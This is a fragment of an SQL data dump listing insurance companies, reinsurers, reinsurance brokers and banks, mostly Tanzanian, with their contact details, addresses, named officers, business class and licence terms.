(14, 'Bumaco Insurance Company Limited', '+255 22 212 4654', '+255 22 212 4654', 'bumacodar@yahoo.com', 'Dar es salaam', '3rd Floor, Luther House Sokoine Drive P.O. Box 13147 DAR ES SALAAM', 'Mr. Ramadhani Mongi', '+255 22 212 4654', 'Non-Life', 'www.bumaco.co.tz', 'Perpetual', 1, 'bumaco-insurance-company-ltd', 9, '2022-08-13 04:43:56', '2022-08-28 03:28:26'),
(15, 'First Assurance Company Limited', '+255767818101 / +255783543939', '255 222 2122130', 'enquiries@firstassurance.co.tz', 'Dar es salaam', 'Peugeot House, Office No. 2 Ground Floor, Upanga Road\r\n	P.O. Box 5799 Dsm', 'Mr. Bosco Bugali', '+255767818101 / +255783543939', 'Non-Life', 'http://www.firstassurance.co.tz', 'Perpetual', 1, 'first-assurance-company-limited', 9, '2022-08-13 04:51:36', '2022-08-28 03:22:09'),
(16, 'GA Insurance Tanzania Limited', '255 713 323 564', '255 713 323 564', 'insure@gatanzania.co.tz', 'Dar es salaam', '4th Floor IT Plaza Ohio Street/Garden Avenue P.O. Box 75908 Dar Es Salaam', 'Mr. Amit Srivastava', '+255 22 2110311/2', 'Non-Life', 'www.gakenya.com/ga-tanzania/', 'Perpetual', 1, 'ga-insurance-tanzania-limited', 9, '2022-08-13 05:34:34', '2022-08-28 03:19:37'),
(17, 'The Heritage Insurance Company Tanzania Limited', '255 22 2664210,774 783318', '255 22 2664210,774 783318', 'info@heritagetanzania.com', 'Dar es salaam', 'OysterBay Office Complex 368 Msasani Road, P.O. Box 7390 Dar es salaam', 'Mr. Shanmugarajan Natarajan', '+255(22)2138696', 'Non-Life', 'www.heritagetanzania.com', 'Perpetual', 1, 'the-heritage-insurance-company-tanzania-limited', 9, '2022-08-13 05:46:34', '2022-08-28 03:16:35'),
(18, 'ICEA Lion Insurance Co Tanzania Limited', '+55 754 244333', '+255 22 277 4999/277 5039', 'insurance@icealion-tz.com', 'Dar es salaam', 'Plot No. 331, Kambarage Road Mikocheni A P.O. Box 1948 DAR ES SALAAM', 'Mr. Ravinarayanan Krishnamurthy', '+255 22 277 5094', 'Non-Life', 'www.icealion-tz.com', 'Perpetual', 1, 'icea-lion-general-insurance-company-t-limited', 9, '2022-08-13 05:50:17', '2022-08-28 03:14:49'),
(19, 'Insurance Group of Tanzania Limited', '+255 22 2131481', '255 22 2131481/0652 289123', 'Info@igt.co.tz', 'Dar es salaam', 'P.O.Box 1605 Dsm', 'Mr. Samuel Muhindi', '+255 22 2131482', 'Non-Life', 'www.igt.co.tz', 'Perpetual', 1, 'insurance-group-of-tanzania-limited', 9, '2022-08-13 05:59:55', '2022-08-28 03:12:35'),
(20, 'Jubilee General Insurance Company of Tanzania Limited', '+255 22 213 5124', '+255 22 213 5121/124', 'jictz@jubileetanzania.com', 'Dar es salaam', 'Amani Place 4th Floor Ohio Street P.O. Box 20524 DAR ES SALAAM', 'Mr. Dipankar Acharya', '+255(22)2135116', 'Non-Life', 'www.jubileeinsurance.com', 'Perpetual', 1, 'the-jubilee-insurance-company-of-tanzania-limited', 9, '2022-08-13 06:03:52', '2022-08-28 02:31:16'),
(21, 'Jubilee Life Insurance Corporation of Tanzania Limited', '255 22 21 35116', '255 22 21 35116', 'enquiry@jubileetanzania.com', 'Dar es salaam', 'P.O.Box 20524 Dsm\r\n\r\n\r\nAmani Place, Ohio Street, 9th Floor P.O. Box 20524 DAR ES SALAAM', 'Mr. Kumar S.  Gaurav', '255 22 2135121', 'Life', 'www.noweb.co,tz', 'Perpetual', 1, 'jubilee-life-insurance-company-ltd', 9, '2022-08-13 06:09:50', '2022-08-28 03:10:22'),
(23, 'Metropolitan Tanzania Insurance Company Limited', '+255 22 211 0630/1', '+255 22 211 0630/1', 'GFortes@metropolitantz.com', 'Dar es salaam', 'Diamond Plaza, 6th Floor P.O. Box 77016 DAR ES SALAAM', 'AG. Mr. Amani Boma', '+255 22 219 7601', 'Life', 'www.noweb.co.tz', 'Perpetual', 1, 'metropolitan-tanzania-insurance-company-limited', 9, '2022-08-13 06:16:45', '2022-08-13 06:16:45'),
(24, 'Metropolitan Tanzania Life Assurance Company Limited', '255 22 2197600', '255 22 2197600', 'info@metropolitantz.com', 'Dar es salaam', '5th Floor, Diamond Plaza,Crn of Mirambo and Samora Avenue\r\n	P.O. Box 77016 Dsm', 'Mr. Suresh Kumar', '(+255) 22 212 0114', 'Non-Life', 'www.metropolitantz.com', 'Perpetual', 1, 'metropolitan-tanzania-life-assurance-company-limited', 9, '2022-08-13 06:19:18', '2022-08-28 03:03:10'),
(25, 'Milembe Insurance Company Limited', '255 22 2666215', '255 22 2666215', 'info@milembeinsurance.com', 'Dar es salaam', '2nd Floor Viva Towers, Ali Hassan Mwinyi Road Dar es Salaam – City Centre P.O. Box 14548 Dar es Salaam, Tanzania', 'Mr. Lexon Makundi', '-', 'Non-Life', 'milembeinsurance.co.tz', 'Perpetual', 1, 'milembe-insurance', 9, '2022-08-13 06:23:51', '2022-08-28 02:56:58'),
(26, 'MO Assurance Company Limited', '+255 22 212 7398', '+255 22 212 7398', 'infomoa@moassurance.co.tz', 'Dar es salaam', '8th Floor, CRDB Building Azikiwe Street P.O. Box 20660 DAR ES SALAAM', 'Mr. Pulin Bihari', '+255 22 212 7268', 'Non-Life', 'www.moassurance.co.tz', 'Perpetual', 1, 'mo-assurance-company-limited', 9, '2022-08-13 06:26:41', '2022-08-28 02:54:24'),
(27, 'National Insurance Corporation of Tanzania Limited', '(255) 22 2113823/9', '(255) 22 2113823/9', 'info-nic@nictanzania.com', 'Dar es salaam', 'P.O.Box 9264 Dsm', 'Dr. Elirehema Joshua Doriye', '-', 'Life', 'www.no.co.tz', 'Perpetual', 1, 'national-insurance-corp-t-ltd', 9, '2022-08-13 06:33:17', '2022-08-28 02:52:46'),
(28, 'Phoenix of Tanzania Assurance Company Limited', '+255 22 212 2777', '+255 22 212 2777', 'info@phoenixtanzania.com', 'Dar es salaam', 'I.P.S. Bld, 8th Floor Samora Avenue/Azikiwe Street P.O. Box 5961 DAR ES SALAAM', 'Mr. Pradeep Srivastava', '+255 22 212 2761', 'Non-Life', 'www.phoenixtanzania.com', 'Perpetual', 1, 'phoenix-of-tanzania-assurance-co-ltd', 9, '2022-08-13 06:39:52', '2022-08-28 02:50:19'),
(29, 'Reliance Insurance Company Tanzania Limited', '+255 22 212 0088-90', '+255 22 212 0088-90', 'insure@reliance.co.tz', 'Dar es salaam', 'Reliance House 3rd & 4th Floor, Plot No 356 United Nation Road Upanga', 'Mr. Parameswaran Rajaram', '+255(22)2112903', 'Non-Life', 'www.reliance.co.tz', 'Perpetual', 1, 'reliance-insurance-co-tanzania-ltd', 9, '2022-08-13 06:43:29', '2022-08-28 02:48:40'),
(30, 'Sanlam General Insurance Tanzania', '+255 786 524 277', '+255 22 212 0188/9', 'info@sanlamgeneralinsurance.co.tz', 'Dar es salaam', '4th Floor, Amani Place, Ohio Street PO Box 21228 Dar es Salaam', 'Mr. Julius Magabe', '+255 22 212 0193', 'Non-Life', 'www.sanlam.co.tz', 'Perpetual', 1, 'sanlam-general-insurance', 9, '2022-08-13 06:46:32', '2022-08-28 02:43:21'),
(31, 'Factory Mutual Insurance Company', '-', '-', 'michaela.chira@fmglobal.com', 'USA', 'USA', 'Mr. Michaela Chira', '-', 'Life', '-', '3 years', 1, 'factory-mutual-insurance-company', 11, '2022-08-27 11:35:32', '2022-08-27 11:35:32'),
(32, 'Mapfre Asistencia, Campania De Seguros Y Reaseguris, S.A', '-', '-', 'diezz@mapfre.com', 'Spain', 'Spain', 'Ms. Leire Jimenez Ayesa', '-', 'Life', '-', '3 years', 1, 'mapfre-asistencia-campania-de-seguros-y-reaseguris-s-a', 11, '2022-08-27 11:38:00', '2022-08-27 11:38:00'),
(33, 'Optimum Global Insurance Company Limited', '-', '-', 'james.webber.@robusgroup.com', 'Guernsey Island', 'Guernsey Island', 'Mr. James Webber', '-', 'Life', '-', '3 years', 1, 'optimum-global-insurance-company-limited', 11, '2022-08-27 11:39:55', '2022-08-27 11:39:55'),
(34, 'Score Se', '-', '-', 'cramamonjiarisoa@scor.com', 'France', 'France', 'Mr. Dennis Kessler', '-', 'Life', '-', '3 years', 1, 'score-se', 11, '2022-08-27 11:41:51', '2022-08-27 11:41:51'),
(35, 'East Africa Reinsurance Company', '-', '-', 'info@eastafricare.com', 'Kenya', 'Kenya', 'Mr. Peter Maina', '-', 'Life', '-', '3 years', 1, 'east-africa-reinsurance-company', 11, '2022-08-27 11:50:44', '2022-08-27 11:50:44'),
(36, 'Ghana Reinsurance Company(Kenya) Limited', '-', '-', 'info@ghanare.com', 'Kenya', 'Kenya', 'Mrs.  Madeleine T. Nangayo', '-', 'Life', '-', '3 years', 1, 'ghana-reinsurance-company-kenya-limited', 11, '2022-08-27 11:52:41', '2022-08-27 11:52:41'),
(37, 'Rochester Reinsurance PLC', '-', '-', 'office@rochester-re.com', 'Union of Comoros', 'Union of Comoros', 'Agota Miklos', '-', 'Life', '-', '3 years', 1, 'rochester-reinsurance-plc', 11, '2022-08-27 11:54:24', '2022-08-27 11:54:24'),
(38, 'Swan Reinsurance PCC', '-', '-', 'corporatefinance@swanforlife.com', 'Mauritius', 'Mauritius', 'Mr. Neelkamal RAGOO', '-', 'Life', '-', '3 years', 1, 'swan-reinsurance-pcc', 11, '2022-08-27 11:58:35', '2022-08-27 11:58:35'),
(39, 'Constantia Insurance Company Limited', '-', '-', 'seanb@constantiagroup.co.za', 'South Africa', 'South Africa', 'Mr. Peter  Geoffrey Todd', '-', 'Life', '-', '3 years', 1, 'constantia-insurance-company-limited', 11, '2022-08-27 12:00:27', '2022-08-27 12:00:27'),
(40, 'International General Insurance Co. Ltd', '-', '-', 'Rawan.Alsulaiman@iginsure.com', 'Bermuda', 'Bermuda', 'Mr. Wasef Jabsheh', '-', 'Life', '-', '3 years', 1, 'international-general-insurance-co-ltd', 11, '2022-08-27 12:02:56', '2022-08-27 12:02:56'),
(41, 'Grand Reinsurance Company Private Limited', '-', '-', 'info@grandre.co.zw', 'Zimbabwe', 'Zimbabwe', 'Mr. Tatenda Katoma', '-', 'Life', '-', '3 years', 1, 'grand-reinsurance-company-private-limited', 11, '2022-08-27 12:04:15', '2022-08-27 12:04:15'),
(42, 'Munich Reinsurance Company of Africa Ltd', '-', '-', 'Btonat@munichre.com', 'South Africa', 'South Africa', 'Mr. Clemance Gorajena', '-', 'Life', '-', '3 years', 1, 'munich-reinsurance-company-of-africa-ltd', 11, '2022-08-27 12:05:47', '2022-08-27 12:05:47'),
(43, 'Continental Reinsurance Limited', NULL, '-', 'info@continental-re.com', 'Kenya', 'Kenya', 'Mr. Souvik Banerjea', '-', 'Life', '-', '3 years', 1, 'continental-reinsurance-limited', 11, '2022-08-27 12:07:25', '2022-08-27 12:07:25'),
(44, 'The Hollard Insurance Company', '-', '-', '-', 'South Africa', 'South Africa', 'Mr. Sakhiwo Ntombela', '-', 'Life', 'www.Hollard.co.za', '3 years', 1, 'the-hollard-insurance-company', 11, '2022-08-27 12:09:12', '2022-08-27 12:09:12'),
(45, 'Ocean International Reinsurance Company Limited', '-', '-', 'compliance@oceanre.biz', 'Barbados', 'Barbados', 'Mr. Carlos G. Chamorro', '-', 'Life', '-', '3 years', 1, 'ocean-international-reinsurance-company-limited', 11, '2022-08-27 12:10:32', '2022-08-27 12:10:32'),
(46, 'Guardrisk International Limited Pcc', '-', '-', 'RamlochunV@guardrisk.co.za', 'Mauritius', 'Mauritius', 'Mr. Shophie Ng Cheong Sang', '-', 'Life', '-', '3 years', 1, 'guardrisk-international-limited-pcc', 11, '2022-08-27 12:14:32', '2022-08-27 12:14:32'),
(47, 'Guardrisk Insurance Compoany Limited', '-', '-', 'bettonb@guardrisk.co.za', 'South Africa', 'South Africa', 'Mr. Herman Schoeman', '-', 'Life', '-', '3 years', 1, 'guardrisk-insurance-compoany-limited', 11, '2022-08-27 12:18:53', '2022-08-27 12:18:53'),
(48, 'Allianz Global Corporate & Specialty SE', '-', '-', 'markus.humberg@allianz.com', 'Germany', 'Germany', 'Mr. Joachim Mueller', '-', 'Life', '-', '3 years', 1, 'allianz-global-corporate-specialty-se', 11, '2022-08-27 12:24:07', '2022-08-27 12:24:07'),
(49, 'Cica-Re', '-', '-', 'cica-re@cica-re.com', 'Togo', 'Togo', 'Mr. Diarassouba Karim', '-', 'Life', '-', '3 years', 1, 'cica-re', 11, '2022-08-27 12:25:33', '2022-08-27 12:25:33'),
(50, 'Santam Limited', '-', '-', '-', 'South Africa', 'South Africa', 'Ms. Leire Lambrechts', '-', 'Life', '-', '3 years', 1, 'santam-limited', 11, '2022-08-27 12:27:41', '2022-08-27 12:27:41'),
(51, 'New Reinsurance Company Limited', '-', '-', 'dwalti@newre.com', 'Swirtzerland', 'Swirtzerland', 'Thomas Braune', '-', 'Life', '-', '3 years', 1, 'new-reinsurance-company-limited', 11, '2022-08-27 12:31:09', '2022-08-27 12:31:09'),
(52, 'Waica Reinsurance (Kenya) Limited', '-', '-', 'info@waicare.com', 'Kenya', 'Kenya', 'Mr. Charles Etemesi', '-', 'Life', '-', '3 years', 1, 'waica-reinsurance-kenya-limited', 11, '2022-08-27 12:33:08', '2022-08-27 12:33:08'),
(53, 'AFRO ASIAN REINSURANCE BROKERS (T) LTD', '-', '-', '-', 'Tanzania', 'Tanzania', '-', '-', 'Life', '-', '3 years', 1, '1-afro-asian-reinsurance-brokers-t-ltd', 13, '2022-08-27 12:59:19', '2022-08-27 14:09:21'),
(54, 'MIC REINSURANCE BROKERS LIMITED', '-', '-', '-', 'Tanzania', 'Tanzania', '-', '-', 'Non-Life', '-', '3 years', 1, '2-mic-reinsurance-brokers-limited', 13, '2022-08-27 13:01:09', '2022-08-27 14:09:12'),
(55, 'TAPEX REINSURANCE BROKERS LIMITED', '-', '-', '-', 'Tanzania', 'Tanzania', '-', '-', 'Non-Life', '-', '3 years', 1, 'tapex-reinsurance-brokers-limited', 13, '2022-08-27 13:01:55', '2022-08-27 13:01:55'),
(56, 'WILLMARS REISURANCE BROKERS LIMITED', '-', '-', '-', 'Tanzania', 'Tanzania', '-', '-', 'Non-Life', '-', '3 years', 1, '4-willmars-reisurance-brokers-limited', 13, '2022-08-27 13:02:39', '2022-08-27 14:09:02'),
(57, 'ARIS', '-', '_', '-', 'Tanzania', 'Tanzania', '-', '-', 'Non-Life', '-', '3 years', 1, 'aris', 13, '2022-08-27 13:03:48', '2022-08-27 13:03:48'),
(58, 'Reinsurance Solution International Limited', '-', '-', '-', '-', '-', '-', '-', 'Life', '-', '3 years', 1, 'reinsurance-solution-international-limited', 12, '2022-08-27 13:07:24', '2022-08-27 13:07:24'),
(59, 'Pioneer Insurance & Reinsurance Brokers Pvt Ltd', '-', '-', '-', '-', '-', '-', '-', 'Life', '-', '3 years', 1, '2-pioneer-insurance-reinsurance-brokers-pvt-ltd', 12, '2022-08-27 13:08:18', '2022-08-27 13:14:00'),
(60, 'CG Re (Africa) Limited', '-', '-', '-', '-', '-', '-', '-', 'Non-Life', '-', '3 years', 1, 'cg-re-africa-limited', 12, '2022-08-27 13:19:45', '2022-08-27 13:19:45'),
(61, 'Group risk  Management Services Limited', '-', '-', '-', '-', '-', '-', '-', 'Non-Life', '-', '3 years', 1, 'group-risk-management-services-limited', 12, '2022-08-27 13:20:54', '2022-08-27 13:20:54'),
(62, 'Specialised Risk Management(SRM )', '-', '-', '-', '-', '-', '-', '-', 'Life', '-', '3 years', 1, 'specialised-risk-management-srm', 12, '2022-08-27 13:22:20', '2022-08-27 13:22:20'),
(63, 'India Insure Risk Management& Insurance Broking Services PVT Ltd', '-', '-', '-', '-', '-', '-', '-', 'Life', '-', '3 years', 1, 'india-insure-risk-management-insurance-broking-services-pvt-ltd', 12, '2022-08-27 13:23:19', '2022-08-27 13:23:19'),
(64, 'Afro-Asian Insurance Servises Limited', '-', '-', '-', '-', '-', '-', '-', 'Life', '-', '3 years', 1, 'afro-asian-insurance-servises-limited', 12, '2022-08-27 13:24:10', '2022-08-27 13:24:10'),
(65, 'Bharat Re-Insurance Broker Pvt Ltd', '-', '-', '-', '-', '-', '-', '-', 'Life', '-', '3 years', 1, 'bharat-re-insurance-broker-pvt-ltd', 12, '2022-08-27 13:24:55', '2022-08-27 13:24:55'),
(66, 'Guy Carpenter & Company (pty) Limited', '-', '-', '-', '-', '-', '-', '-', 'Life', '-', '3 years', 1, 'guy-carpenter-company-pty-limited', 12, '2022-08-27 13:25:40', '2022-08-27 13:25:40'),
(67, 'First  Reinsurance Brokers Africa Ltd', '-', '-', '-', '-', '-', '-', '-', 'Life', '-', '3 years', 1, 'first-reinsurance-brokers-africa-ltd', 12, '2022-08-27 13:27:05', '2022-08-27 13:27:05'),
(68, 'Alesco Risk Management Services Limited', '-', '-', '-', '-', '-', '-', '-', 'Life', '-', '3 years', 1, 'alesco-risk-management-services-limited-2', 12, '2022-08-27 13:28:12', '2022-08-27 13:28:12'),
(69, 'DJA Aviation (PTY) Ltd', '-', '-', '-', '-', '-', '-', '-', 'Life', '-', '3 years', 1, 'dja-aviation-pty-ltd', 12, '2022-08-27 13:29:07', '2022-08-27 13:29:07'),
(70, 'Maksure Financial Holdings t/a Maksure Risk Solutions', '-', '-', '-', '-', '-', '-', '-', 'Life', '-', '3 years', 1, 'maksure-financial-holdings-t-a-maksure-risk-solutions', 12, '2022-08-27 13:30:13', '2022-08-27 13:30:13'),
(71, 'Apex Reinsurance Brokers Limited', '-', '-', '-', '-', '-', '-', '-', 'Life', '-', '3 years', 1, 'apex-reinsurance-brokers-limited', 12, '2022-08-27 13:30:53', '2022-08-27 13:30:53'),
(72, 'Marsh Limited Reinsurance Broker', '-', '-', '-', '-', '-', '-', '-', 'Life', '-', '3 years', 1, 'marsh-limited-reinsurance-broker', 12, '2022-08-27 13:31:57', '2022-08-27 13:31:57'),
(73, 'Arthur J. Gallagher (UK) Limited', '-', '-', '-', '-', '-', '-', '-', 'Life', '-', '3 years', 1, 'arthur-j-gallagher-uk-limited', 12, '2022-08-27 13:32:42', '2022-08-27 13:32:42'),
(74, 'Total Risk Solutions (London) Limited', '-', '-', '-', '-', '-', '-', '-', 'Life', '-', '3 years', 1, 'total-risk-solutions-london-limited', 12, '2022-08-27 13:33:20', '2022-08-27 13:33:20'),
(75, 'J.B.BODA Reinsurance Brokers', '-', '-', '-', '-', '-', '-', '-', 'Life', '-', '3 years', 1, 'j-b-boda-reinsurance-brokers', 12, '2022-08-27 13:34:08', '2022-08-27 13:34:08'),
(76, 'Howden UK Group Limited', '-', '-', '-', '-', '-', '-', '-', 'Life', '-', '3 years', 1, 'howden-uk-group-limited', 12, '2022-08-27 13:34:48', '2022-08-27 13:34:48'),
(77, 'Nasco France Sas', '-', '-', '-', '-', '-', '-', '-', 'Life', '-', '3 years', 1, 'nasco-france-sas', 12, '2022-08-27 13:35:29', '2022-08-27 13:35:29'),
(78, 'Siaci Saint Honore Sas', '-', '-', '-', '-', '-', '-', '-', 'Life', '-', '3 years', 1, 'siaci-saint-honore-sas', 12, '2022-08-27 13:36:03', '2022-08-27 13:36:03'),
(79, 'Crispin Speers and Partners', '-', '-', '-', '-', '-', '-', '-', 'Life', '-', '3 years', 1, 'crispin-speers-and-partners', 12, '2022-08-27 13:36:45', '2022-08-27 13:36:45'),
(80, 'Genesis Risk Managers', '-', '-', '-', '-', '-', '-', '-', 'Life', '-', '3 years', 1, 'genesis-risk-managers', 12, '2022-08-27 13:37:34', '2022-08-27 13:37:34'),
(81, 'Price Forbes & Partners Limited', '-', '-', '-', '-', '-', '-', '-', 'Non-Life', '-', '3 years', 1, 'price-forbes-partners-limited', 12, '2022-08-27 13:38:20', '2022-08-27 13:38:20'),
(82, 'Marsh Africa (PTY) Limited', '-', '-', '-', '-', '-', '-', '-', 'Life', '-', '3 years', 1, 'marsh-africa-pty-limited', 12, '2022-08-27 13:38:58', '2022-08-27 13:38:58'),
(83, 'STS International', '-', '-', '-', '-', '-', '-', '-', 'Life', '-', '3 years', 1, 'sts-international', 12, '2022-08-27 13:39:42', '2022-08-27 13:39:42'),
(84, 'Lockton (Mena) Limited', '-', '-', '-', '-', '-', '-', '-', 'Life', '-', '3 years', 1, 'lockton-mena-limited', 12, '2022-08-27 13:40:18', '2022-08-27 13:40:18'),
(85, 'Foten Reinsurance Broker', '-', '-', '-', '-', '-', '-', '-', 'Life', '-', '3 years', 1, 'foten-reinsurance-broker', 12, '2022-08-27 13:41:02', '2022-08-27 13:41:02'),
(86, 'Kek Reinsurance Broker', '-', '-', '-', '-', '-', '-', '-', 'Life', '-', '3 years', 1, 'kek-reinsurance-broker', 12, '2022-08-27 13:41:32', '2022-08-27 13:41:32'),
(87, 'Minet Kenya Insurance Brokers Limited', '-', '-', '-', '-', '-', '-', '-', 'Life', '-', '3 years', 1, 'minet-kenya-insurance-brokers-limited', 12, '2022-08-27 13:42:09', '2022-08-27 13:42:09'),
(88, 'Howden Insurance Brokers LLC', '-', '-', '-', '-', '-', '-', '-', 'Life', '-', '3 years', 1, 'howden-insurance-brokers-llc', 12, '2022-08-27 13:42:39', '2022-08-27 13:42:39'),
(89, 'GIC Re South Africa Limited', '-', '-', '-', '-', '-', '-', '-', 'Life', '-', '3 years', 1, 'gic-re-south-africa-limited', 12, '2022-08-27 13:43:11', '2022-08-27 13:43:11'),
(90, 'African Reinsurance Consultants Limited', '-', '-', '-', '-', '-', '-', '-', 'Life', '-', '3 years', 1, 'african-reinsurance-consultants-limited', 12, '2022-08-27 13:43:45', '2022-08-27 13:43:45'),
(91, 'Fair Insurance & Reinsurance Brokers Ltd', '-', '-', '-', '-', '-', '-', '-', 'Life', '-', '3 years', 1, 'fair-insurance-reinsurance-brokers-ltd', 12, '2022-08-27 13:44:29', '2022-08-27 13:44:29'),
(92, 'Mukoma Financial Services', '-', '-', '-', '-', '-', '-', '-', 'Life', '-', '3 years', 1, 'mukoma-financial-services', 12, '2022-08-27 13:45:09', '2022-08-27 13:45:09'),
(93, 'Tanzania Reinsurance Company Ltd', '255 22 292 2341/3,0757 211 000', '255 22 292 2341/3,0757 211 000', 'mail@tan-re.co.tz', 'Dar es Salaam', 'P.O. Box 1505 Dsm', 'Mr. R. Kakusa', '255 22 292 2341/3,0757 211 000', 'Life', '-', '3 years', 1, 'tanzania-reinsurance-company-ltd', 14, '2022-08-27 13:56:54', '2022-08-27 13:56:54'),
(94, 'Grand Reinsurance Company', '255 689 663 398', '255 689 663 398', ' jechek@grandreinsurance.com', 'Dar es Salaam', 'P.O BOX 38658 Dsm', 'Mr. Kudakwashe Jeche', '-', 'Life', '-', '3 years', 1, 'grand-reinsurance-company', 14, '2022-08-27 13:58:24', '2022-08-27 13:58:24'),
(95, 'CRDB BANK PLC', '-', '-', '-', 'Daresalaam', 'P.O BOX 268 DSM', '-', '-', 'Non-Life', '-', 'Perpetual', 1, 'crdb-bank-plc', 15, '2022-08-27 14:08:19', '2022-08-27 14:08:19'),
(96, 'NMB BANK', '-', '-', '-', 'Daresalaam', 'P.O BOX 9213 DSM', '-', '-', 'Non-Life', '-', 'Perpetual', 1, 'nmb-bank', 15, '2022-08-27 14:10:49', '2022-08-27 14:10:49'),
(97, 'AZANIA BANK', '-', '-', '-', 'Daresalaam', 'P.O BOX 32089 DSM', '-', '-', 'Non-Life', '-', 'Perpetual', 1, 'azania-bank', 15, '2022-08-27 14:11:47', '2022-08-27 14:11:47'),
(98, 'MWALIMU COMMERCIAL BANK PLC', '-', '-', '-', 'Daresalaam', 'P.O BOX 61002 DSM', '-', '-', 'Non-Life', '-', 'Perpetual', 1, 'mwalimu-commercial-bank-plc', 15, '2022-08-27 14:13:01', '2022-08-27 14:13:01'),
(99, 'MKOMBOZI COMMERCIAL BANK', '-', '-', '-', 'Daresalaam', 'P.O BOX 38448 DSM', '-', '-', 'Non-Life', '-', 'Perpetual', 1, 'mkombozi-commercial-bank', 15, '2022-08-27 14:15:57', '2022-08-27 14:19:29'),
(100, 'DIAMOND TRUST BANK (T) LTD', '-', '-', '-', 'Daresalaam', 'P.O BOX 115 DSM', '-', '-', 'Non-Life', '-', 'Perpetual', 1, 'diamond-trust-bank-t-ltd', 15, '2022-08-27 14:16:46', '2022-08-27 14:19:14'),
(101, 'STANBIC BANK TANZANIA LTD', '-', '-', '-', 'Daresalaam', 'P.O BOX 72647 DSM', '-', '-', 'Non-Life', '-', 'Perpetual', 1, 'stanbic-bank-tanzania-ltd', 15, '2022-08-27 14:17:28', '2022-08-27 14:19:02'),
(102, 'TPB BANK', '-', '-', '-', 'Daresalaam', 'P.O BOX 9300 DSM', '-', '-', 'Non-Life', '-', 'Perpetual', 1, 'tpb-bank', 15, '2022-08-27 14:18:29', '2022-08-27 14:18:29'),
(103, 'ABSA BANK TANZANIA LTD', '-', '-', '-', 'Daresalaam', 'P.O BOX 5137 DSM', '-', '-', 'Non-Life', '-', 'Perpetual', 1, 'absa-bank-tanzania-ltd', 15, '2022-08-27 14:20:27', '2022-08-27 14:20:27'),
(104, 'STANDARD CHARTERED BANK TZ LTD', '-', '-', '-', 'Daresalaam', 'P.O BOX 9011 DSM', '-', '-', 'Non-Life', '-', 'Perpetual', 1, 'standard-chartered-bank-tz-ltd', 15, '2022-08-27 14:21:17', '2022-08-27 14:21:17'),
(105, 'FIRST NATIONAL BANK TANZANIA', '-', '-', '-', 'Daresalaam', 'P.O BOX 72290 DSM', '-', '-', 'Non-Life', '-', 'Perpetual', 1, 'first-national-bank-tanzania', 15, '2022-08-27 14:22:01', '2022-08-27 14:22:01'),
(106, 'DCB COMMERCIAL BANK PLC', '-', '-', '-', 'Daresalaam', 'P.O.BOX 19798 DSM', '-', '-', 'Non-Life', '-', 'Perpetual', 1, 'dcb-commercial-bank-plc', 15, '2022-08-27 14:23:09', '2022-08-27 14:23:09'),
(107, 'EXIM BANK TANZANIA LTD', '-', '-', '-', 'Daresalaam', 'P.O.BOX 1431 DSM', '-', '-', 'Non-Life', '-', 'Perpetual', 1, 'exim-bank-tanzania-ltd', 15, '2022-08-27 14:24:14', '2022-08-27 14:24:14'),
(108, 'LETSHEGO BANK TANZANIA LTD', '-', '-', '-', 'Daresalaam', 'P.O.BOX 34459 DSM', '-', '-', 'Non-Life', '-', 'Perpetual', 1, 'letshego-bank-tanzania-ltd', 15, '2022-08-27 14:25:11', '2022-08-27 14:25:11'),
(109, 'ECOBANK TANZANIA LIMITED', '-', '-', '-', '-', 'P.O BOX 20500 DSM', '-', '-', 'Non-Life', '-', 'Perpetual', 1, 'ecobank-tanzania-limited', 15, '2022-08-27 14:25:52', '2022-08-27 14:25:52'),
(110, 'UCHUMI COMMERCIAL BANK LIMITED', '-', '-', '-', 'Daresalaam', '-', '-', '-', 'Non-Life', '-', 'Perpetual', 1, 'uchumi-commercial-bank-limited', 15, '2022-08-27 14:26:58', '2022-08-27 14:26:58'),
(111, 'BANK OF AFRIA TANZANIA LIMITED', '-', '-', '-', 'Daresalaam', '-', '-', '-', 'Non-Life', '-', 'Perpetual', 1, 'bank-of-afria-tanzania-limited', 15, '2022-08-27 14:27:44', '2022-08-27 14:27:44'),
(112, 'EQUITY BANK TANZANIA LIMITED', '-', '-', '-', 'Daresalaam', '-', '-', '-', 'Non-Life', '-', 'Perpetual', 1, 'equity-bank-tanzania-limited', 15, '2022-08-27 14:28:59', '2022-08-27 14:28:59'),
(113, 'MWANGA HAKIKA MICROFINANCE BANK LIMITED', '-', '-', '-', 'Daresalaam', '-', '-', '-', 'Non-Life', '-', 'Perpetual', 1, 'mwanga-hakika-microfinance-bank-limited', 15, '2022-08-27 14:30:33', '2022-08-27 14:30:33'),
(114, 'FINCA MICROFINANCE BANK LIMITED', '-', '-', '-', 'Daresalaam', '-', '-', '-', 'Non-Life', '-', 'Perpetual', 1, 'finca-microfinance-bank-limited', 15, '2022-08-27 14:31:19', '2022-08-27 14:31:19'),
(115, 'KCB BANK TANZANIA LIMITED', '-', '-', '-', 'Daresalaam', '-', '-', '-', 'Non-Life', '-', 'Perpetual', 1, 'kcb-bank-tanzania-limited', 15, '2022-08-27 14:32:01', '2022-08-27 14:32:01'),
(116, 'I & M BANK TANZANIA LIMITED', '-', '-', '-', 'Daresalaam', '-', '-', '-', 'Non-Life', '-', 'Perpetual', 1, 'i-m-bank-tanzania-limited', 15, '2022-08-27 14:32:47', '2022-08-27 14:32:47'),
(117, 'FIRST HOUSING FINANCE TANZANIA LIMITED', '-', '-', '-', 'Daresalaam', '-', '-', '-', 'Non-Life', '-', 'Perpetual', 1, 'first-housing-finance-tanzania-limited', 15, '2022-08-27 14:33:23', '2022-08-27 14:33:23'),
(118, 'AKIBA COMM. BANK', '-', '-', '-', 'Daresalaam', '-', '-', '-', 'Non-Life', '-', 'Perpetual', 1, 'akiba-comm-bank', 15, '2022-08-27 14:34:15', '2022-08-27 14:34:15'),
(119, 'MAENDELEO BANK', '-', '-', '-', 'Daresalaam', '-', '-', '-', 'Non-Life', '-', 'Perpetual', 1, 'maendeleo-bank', 15, '2022-08-27 14:34:57', '2022-08-27 14:34:57'),
(120, 'MUCOBA BANK PUBLIC LIMITED COMPANY', '-', '-', '-', 'Daresalaam', '-', '-', '-', 'Non-Life', '-', 'Perpetual', 1, 'mucoba-bank-public-limited-company', 15, '2022-08-27 14:35:47', '2022-08-27 14:35:47'),
(121, 'COMMERCIAL BANK OF AFRICA (NCBA)', '-', '-', '-', 'Daresalaam', '-', '-', '-', 'Non-Life', '-', 'Perpetual', 1, 'commercial-bank-of-africa-ncba', 15, '2022-08-27 14:36:24', '2022-08-27 14:36:24'),
